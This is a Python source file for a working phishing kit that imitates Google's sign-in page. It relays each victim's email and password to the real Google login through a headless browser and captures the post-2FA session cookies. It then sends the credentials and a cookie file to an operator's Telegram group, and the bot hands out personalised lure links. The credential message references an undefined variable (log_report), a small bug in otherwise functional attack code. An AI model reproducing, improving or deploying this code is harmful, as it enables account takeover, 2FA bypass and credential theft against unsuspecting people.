import os
import json
import asyncio
import telebot
from quart import Quart, render_template, request, redirect, session
from playwright.async_api import async_playwright
from threading import Thread

# --- CONFIG ---
# Get these from your @BotFather and Koyeb Env Vars
BOT_TOKEN = os.environ.get("BOT_TOKEN")
GROUP_ID = int(os.environ.get("GROUP_ID", 0))
# Example: https://unaware-conny-vinzystorez-b74d6e02.koyeb.app
BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)
app.secret_key = "vinzy_vault_key" # Change this to any random string

# Dictionary to store browser sessions so they don't close between pages
sessions = {}

async def get_session(tid):
    """ Creates or retrieves a persistent browser session for a specific user """
    if tid not in sessions:
        p = await async_playwright().start()
        # Launching with stability flags for the 'Small' instance
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        sessions[tid] = {"p": p, "b": browser, "page": page, "ctx": context}
    return sessions[tid]

@app.route('/')
async def index():
    """ Step 1: Show the Email Page """
    tid = request.args.get('tid', 'Unknown')
    # Pre-warm the browser for this user
    await get_session(tid)
    return await render_template('google.html', tid=tid, step="email")

@app.route('/login', methods=['POST'])
async def login():
    """ Step 2 & 3: Mirror the inputs to the real Google """
    form = await request.form
    email = form.get('identifier')
    password = form.get('password')
    tid = form.get('tid')

    user_session = await get_session(tid)
    page = user_session["page"]

    # --- HANDLING EMAIL STEP ---
    if email and not password:
        try:
            await page.goto("https://accounts.google.com/signin")
            await page.fill('input[type="email"]', email)
            await page.click('#identifierNext')
            
            # Wait for Google to transition to the password field
            await asyncio.sleep(2) 
            
            # Check if we moved to the password page or if there's an error
            content = await page.content()
            if 'type="password"' in content:
                return await render_template('google.html', tid=tid, email=email, step="password")
            else:
                return "Google blocked this email or flagged the connection. Try a different IP/Proxy."
        except Exception as e:
            return f"Mirroring Error (Email): {str(e)}"

    # --- HANDLING PASSWORD STEP ---
    if email and password:
        try:
            await page.fill('input[type="password"]', password)
            await page.click('#passwordNext')
            
            # Wait for 2FA or Success (User might need to 'Tap Yes' on their phone)
            await asyncio.sleep(5)
            
            # Capture the Cookies (The 'Gold' for bypassing 2FA)
            cookies = await user_session["ctx"].cookies()
            
            # Send report to Telegram
            log_msg = (
                f"🚀 **MIRROR SUCCESS**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"👤 **Email:** `{email}`\n"
                f"🔑 **Pass:** `{password}`\n"
                f"🆔 **TID:** `{tid}`\n"
                f"━━━━━━━━━━━━━━━"
            )
            bot.send_message(GROUP_ID, log_report, parse_mode="Markdown")

            # Save and send cookie file
            cookie_file = f"session_{tid}.json"
            with open(cookie_file, "w") as f:
                json.dump(cookies, f, indent=2)
            with open(cookie_file, "rb") as f:
                bot.send_document(GROUP_ID, f, caption=f"🍪 Import to browser for {email}")
            
            os.remove(cookie_file)
            
            # Once finished, close that specific browser to save RAM
            await user_session["b"].close()
            del sessions[tid]

            return redirect("https://myaccount.google.com")
            
        except Exception as e:
            bot.send_message(GROUP_ID, f"❌ Mirror Error: {e}")
            return redirect("https://accounts.google.com")

# --- BOT COMMANDS ---

@bot.message_handler(commands=['link'])
def send_link(m):
    user_id = m.from_user.id
    target_url = f"{BASE_URL}/?tid={user_id}"
    bot.reply_to(m, f"🔗 **Your Mirror Link:**\n`{target_url}`", parse_mode="Markdown")

def run_bot():
    """ Polling thread for the Telegram Bot """
    try:
        bot.infinity_polling()
    except:
        pass

if __name__ == "__main__":
    # Start bot in background
    Thread(target=run_bot).start()
    
    # Start Quart Web Server
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
